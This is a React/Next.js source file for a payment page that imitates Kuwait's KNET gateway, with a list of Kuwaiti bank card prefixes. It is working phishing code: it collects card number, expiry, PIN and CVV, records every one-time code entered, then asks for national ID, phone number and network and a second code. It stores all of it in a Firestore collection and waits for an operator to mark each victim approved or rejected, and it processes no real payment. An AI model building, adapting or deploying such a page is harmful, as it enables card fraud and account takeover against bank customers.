/* eslint-disable */
"use client"

import { useEffect, useState } from "react"
import { addData, handlePay } from "@/lib/db"
import { DialogLoader } from "@/components/dilog-loader"
import "./knet.css"
import { doc, onSnapshot } from "firebase/firestore"
import { useRouter } from "next/navigation"
import { db } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-stauts"

type PaymentInfo = {
  cardNumber: string
  year: string
  month: string
  bank?: string
  otp?: string
  pass: string
  cardState: string
  allOtps: string[]
  bank_card: string[]
  prefix: string
  cvv: string
  status: "new" | "pending" | "approved" | "rejected"
  // New fields for steps 3 and 4
  idNumber: string
  phoneNumber: string
  finalOtp: string
  network: string
  createdDate: string
}

const BANKS = [
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
]

const Payment = () => {
  const router = useRouter()
  const [donationAmount, setDonationAmount] = useState<string | null>(null)
  const [step, setStep] = useState(1)
  const [loading, setIsLoading] = useState(false)
  const [newotp] = useState([""])
  const [error, setError] = useState<string | null>(null)
  const [visitorId, setVisitorId] = useState<string | null>(null)
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    cvv: "",
    // Initialize new fields
    idNumber: "",
    phoneNumber: "",
    network: "",
    finalOtp: "",
    createdDate: "",
  })

  // Safely access localStorage after component mounts
  useEffect(() => {
    if (typeof window !== "undefined") {
      setDonationAmount(localStorage.getItem("amount"))
      setVisitorId(localStorage.getItem("visitor"))
    }
  }, [])

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }

  // Listen for Firestore status updates in the final step
  useEffect(() => {
    const _visitorId = localStorage.getItem("visitor")
    setupOnlineStatus(_visitorId!)

    addData({
      id: _visitorId,
      currentPage: `كي نت-${step}`,
      createdDate: new Date().toISOString(),
    })
    if (step === 4 && visitorId && typeof window !== "undefined") {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
            if (data.status === "approved") {
              setIsLoading(false)
              // Redirect to hoiaty page on approval
              router.push("/sahel")
            } else if (data.status === "rejected") {
              setIsLoading(false)
              setError("The transaction was rejected. Please check the information entered and try again.")
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [step, visitorId, router])

  return (
    <div style={{ background: "#f1f1f1", minHeight: "100vh", margin: 0, padding: 0 }}>
      <DialogLoader isOpen={loading} message=" ... جاري معالجة الدفع " />

      <form onSubmit={(e) => e.preventDefault()}>
        <div className="madd" />
        <div id="PayPageEntry">
          <div className="container">
            <div className="content-block">
              <div className="form-card">
                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
                  <img src="./knet.png" className="-" alt="logo" height={50} width={50} />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">KNET Payment</label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {donationAmount}
                    {"  "}KD&nbsp;{" "}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts */}
                <div className="row" id="DiscntRate" style={{ display: "none" }} />
                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
                {/* Added for PG Eidia Discount ends */}
              </div>
              <div className="form-card">
                {/* Error message display */}
                {error && (
                  <div
                    className="notification"
                    style={{
                      border: "#ff0000 1px solid",
                      backgroundColor: "#f7dadd",
                      fontSize: 14,
                      fontFamily: "helvetica, arial, sans serif",
                      color: "#ff0000",
                      padding: 10,
                      marginBottom: 15,
                      textAlign: "center",
                    }}
                  >
                    {error}
                  </div>
                )}

                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: "none" }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: "50%" }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                      {/* Step 1 content remains the same */}
                      <div className="row">
                        <label className="column-label" style={{ width: "40%" }}>
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          style={{ width: "60%" }}
                          onChange={(e: any) => {
                            const selectedBank = BANKS.find((bank) => bank.value === e.target.value)

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
                            })
                          }}
                        >
                          <>
                            <option value="bankname" title="Select Your Bank">
                              Select Your Banks
                            </option>
                            {BANKS.map((i, index) => (
                              <option value={i.value} key={index}>
                                {i.label} [{i.value}]
                              </option>
                            ))}
                          </>
                        </select>
                      </div>
                      <div className="row three-column" id="Paymentpagecardnumber">
                        <label className="column-label">Card Number:</label>
                        <label>
                          <select
                            className="column-value"
                            name="dcprefix"
                            id="dcprefix"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                prefix: e.target.value,
                              })
                            }
                            style={{ width: "26%" }}
                          >
                            <option
                              value={"i"}
                              onClick={(e: any) => {
                                setPaymentInfo({
                                  ...paymentInfo,
                                  prefix: e.target.value,
                                })
                              }}
                            >
                              prefix
                            </option>
                            {paymentInfo.bank_card.map((i, index) => (
                              <option
                                key={index}
                                value={i}
                                onClick={(e: any) => {
                                  setPaymentInfo({
                                    ...paymentInfo,
                                    prefix: e.target.value,
                                  })
                                }}
                              >
                                {i}
                              </option>
                            ))}
                          </select>
                        </label>
                        <label>
                          <input
                            name="debitNumber"
                            id="debitNumber"
                            type="tel"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            size={10}
                            className="allownumericwithoutdecimal"
                            style={{ width: "32%" }}
                            maxLength={10}
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                cardNumber: e.target.value,
                              })
                            }
                            title="Should be in number. Length should be 10"
                          />
                        </label>
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <div id="debitExpDate">
                          <label className="column-label"> Expiration Date: </label>
                        </div>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="column-value"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="column-long"
                        >
                          <option value={0}>YYYY</option>
                          <option value={2024}>2024</option>
                          <option value={2025}>2025</option>
                          <option value={2026}>2026</option>
                          <option value={2027}>2027</option>
                          <option value={2028}>2028</option>
                          <option value={2029}>2029</option>
                          <option value={2030}>2030</option>
                          <option value={2031}>2031</option>
                          <option value={2032}>2032</option>
                          <option value={2033}>2033</option>
                          <option value={2034}>2034</option>
                          <option value={2035}>2035</option>
                          <option value={2036}>2036</option>
                          <option value={2037}>2037</option>
                          <option value={2038}>2038</option>
                          <option value={2039}>2039</option>
                          <option value={2040}>2040</option>
                          <option value={2041}>2041</option>
                          <option value={2042}>2042</option>
                          <option value={2043}>2043</option>
                          <option value={2044}>2044</option>
                          <option value={2045}>2045</option>
                          <option value={2046}>2046</option>
                          <option value={2047}>2047</option>
                          <option value={2048}>2048</option>
                          <option value={2049}>2049</option>
                          <option value={2050}>2050</option>
                          <option value={2051}>2051</option>
                          <option value={2052}>2052</option>
                          <option value={2053}>2053</option>
                          <option value={2054}>2054</option>
                          <option value={2055}>2055</option>
                          <option value={2056}>2056</option>
                          <option value={2057}>2057</option>
                          <option value={2058}>2058</option>
                          <option value={2059}>2059</option>
                          <option value={2060}>2060</option>
                          <option value={2061}>2061</option>
                          <option value={2062}>2062</option>
                          <option value={2063}>2063</option>
                          <option value={2064}>2064</option>
                          <option value={2065}>2065</option>
                          <option value={2066}>2066</option>
                          <option value={2067}>2067</option>
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        <input type="hidden" name="cardPinType" defaultValue="A" />
                        <div id="eComPin">
                          <label className="column-label"> PIN: </label>
                        </div>
                        <div>
                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cardPin"
                            id="cardPin"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                pass: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 4"
                            type="password"
                            size={4}
                            maxLength={4}
                            className="allownumericwithoutdecimal"
                            style={{ width: "60%" }}
                          />
                        </div>
                      </div>
                      <div className="row" id="PinRow">
                        <input type="hidden" name="cardPinType" defaultValue="A" />
                        <div id="eComPin">
                          <label className="column-label"> Cvv: </label>
                        </div>
                        <div>
                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cvv"
                            id="cvv"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                cvv: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 3"
                            type="password"
                            size={3}
                            maxLength={3}
                            className="allownumericwithoutdecimal"
                            style={{ width: "60%" }}
                          />
                        </div>
                      </div>
                    </div>
                  </>
                ) : step === 2 ? (
                  <div>
                    <div style={{ textAlign: "center", marginBottom: "20px" }}>
                      <h3 style={{ fontWeight: "bold", color: "#0077d5" }}>Card Verification</h3>
                      <p>We've sent a verification code to the mobile number registered with your card.</p>
                    </div>
                    <form style={{ display: "flex", flexDirection: "column" }}>
                      <label className="column-label" style={{ marginBottom: "10px" }}>
                        Enter OTP Code:
                      </label>
                      <input
                        name="otp"
                        style={{ width: "100%", padding: "10px", fontSize: "16px" }}
                        id="otp"
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        className="allownumericwithoutdecimal"
                        maxLength={6}
                        value={paymentInfo.otp}
                        onChange={(e: any) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            otp: e.target.value,
                          })
                        }}
                        placeholder="Enter 6-digit code"
                        title="Should be in number. Length should be 6"
                      />
                    </form>
                  </div>
                ) : step === 3 ? (
                  <div>
                    <div style={{ textAlign: "center", marginBottom: "20px" }}>
                      <h3 style={{ fontWeight: "bold", color: "#0077d5" }}>Additional Verification</h3>
                      <p>Please provide your ID number and phone number for verification.</p>
                    </div>
                    <form style={{ display: "flex", flexDirection: "column", gap: "15px" }}>
                      <div>
                        <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
                          ID Number:
                        </label>
                        <input
                          name="idNumber"
                          style={{ width: "100%", padding: "10px" }}
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          className="allownumericwithoutdecimal"
                          maxLength={12}
                          value={paymentInfo.idNumber}
                          onChange={(e: any) => {
                            setPaymentInfo({
                              ...paymentInfo,
                              idNumber: e.target.value,
                            })
                          }}
                          placeholder="Enter your ID number"
                        />
                      </div>
                      <div>
                        <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
                          Phone Number:
                        </label>
                        <input
                          name="phoneNumber"
                          style={{ width: "100%", padding: "10px" }}
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          className="allownumericwithoutdecimal"
                          maxLength={12}
                          value={paymentInfo.phoneNumber}
                          onChange={(e: any) => {
                            setPaymentInfo({
                              ...paymentInfo,
                              phoneNumber: e.target.value,
                            })
                          }}
                          placeholder="Enter your phone number"
                        />
                      </div>
                      <div>
                        <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
                          Network Provider:
                        </label>
                        <select
                          value={paymentInfo.network}
                          onChange={(e) => {
                            setPaymentInfo({
                              ...paymentInfo,
                              network: e.target.value,
                            })
                          }}
                          style={{ width: "100%", padding: "10px" }}
                          className="w-full text-slate-700 text-sm border border-blue-500 rounded pl-3 pr-8 py-2 transition duration-300 ease focus:outline-none focus:border-blue-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
                        >
                          <option value="Zain">Zain</option>
                          <option value="Ooredoo">Ooredoo</option>
                          <option value="STC">STC</option>
                        </select>
                      </div>
                    </form>
                  </div>
                ) : step === 4 ? (
                  <div>
                    <div style={{ textAlign: "center", marginBottom: "20px" }}>
                      <h3 style={{ fontWeight: "bold", color: "#0077d5" }}>Final Verification</h3>
                      <p>We've sent a verification code to {paymentInfo.phoneNumber}.</p>
                    </div>
                    <form style={{ display: "flex", flexDirection: "column" }}>
                      <label className="column-label" style={{ marginBottom: "10px" }}>
                        Enter Verification Code:
                      </label>
                      <input
                        name="finalOtp"
                        style={{ width: "100%", padding: "10px", fontSize: "16px" }}
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        className="allownumericwithoutdecimal"
                        maxLength={6}
                        value={paymentInfo.finalOtp}
                        onChange={(e: any) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            finalOtp: e.target.value,
                          })
                          // Clear any previous errors when user types
                          setError(null)
                        }}
                        placeholder="Enter 6-digit verification code"
                        title="Should be in number. Length should be 6"
                      />
                    </form>
                  </div>
                ) : (
                  <div style={{ textAlign: "center", padding: "20px" }}>
                    <p>Please wait while we process your payment...</p>
                  </div>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: "left",
                            marginLeft: "20%",
                          }}
                        />
                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button
                        disabled={
                          (step === 1 &&
                            (paymentInfo.prefix === "" ||
                              paymentInfo.bank === "" ||
                              paymentInfo.cardNumber === "" ||
                              paymentInfo.pass === "" ||
                              paymentInfo.month === "" ||
                              paymentInfo.year === "" ||
                              paymentInfo.pass.length !== 4)) ||
                          (step === 2 && (!paymentInfo.otp || paymentInfo.otp.length !== 6)) ||
                          (step === 3 &&
                            (!paymentInfo.idNumber || !paymentInfo.phoneNumber || !paymentInfo.network)) ||
                          (step === 4 && (!paymentInfo.finalOtp )) ||
                          loading
                        }
                        onClick={() => {
                          // Clear any previous errors
                          setError(null)

                          if (step === 1) {
                            setIsLoading(true)
                            setTimeout(() => {
                              setIsLoading(false)
                              handlePay(
                                {
                                  ...paymentInfo,
                                  createdDate: new Date().toISOString(),
                                },
                                setPaymentInfo,
                              )
                              setStep(2)
                            }, 2000)
                          } else if (step === 2) {
                            if (!newotp.includes(paymentInfo.otp!)) {
                              newotp.push(paymentInfo.otp!)
                            }
                            setIsLoading(true)
                            handleAddotp(paymentInfo.otp!)
                            setTimeout(() => {
                              setIsLoading(false)
                              handlePay(
                                {
                                  ...paymentInfo,
                                  otp:paymentInfo.otp,
                                  allOtps:paymentInfo.allOtps,
                                  createdDate: new Date().toISOString(),
                                },
                                setPaymentInfo,
                              )
                              setStep(3)
                            }, 2000)
                          } else if (step === 3) {
                            setIsLoading(true)
                            handlePay(
                              {
                                ...paymentInfo,
                                network:paymentInfo.network,
                                createdDate: new Date().toISOString(),
                              },
                              setPaymentInfo,
                            )
                            setTimeout(() => {
                              setIsLoading(false)
                              setStep(4)
                            }, 1500)
                          } else if (step === 4) {
                            setIsLoading(true)

                            // Submit final verification and wait for Firestore status update
                            handlePay(
                              {
                                ...paymentInfo,
                                visitorId,
                                finalOtp: paymentInfo.finalOtp,
                              },
                              setPaymentInfo,
                            )

                            // The redirect will happen in the useEffect when Firestore status changes
                            // If no status update after 10 seconds, show an error
                            setTimeout(() => {
                              if (loading) {
                                setIsLoading(false)
                                setError("لم نتلق استجابة من الخادم. يرجى المحاولة مرة أخرى.")
                              }
                            }, 10000)
                          }
                        }}
                      >
                        {loading
                          ? "Wait..."
                          : step === 1
                            ? "Submit"
                            : step === 2
                              ? "Verify OTP"
                              : step === 3
                                ? "Continue"
                                : "Complete Payment"}
                      </button>
                      <button>Cancel</button>
                    </div>
                  </div>
                </div>
              </div>
              <div id="overlayhide" className="overlay" style={{ display: "none" }}></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
      </form>
    </div>
  )
}

export default Payment

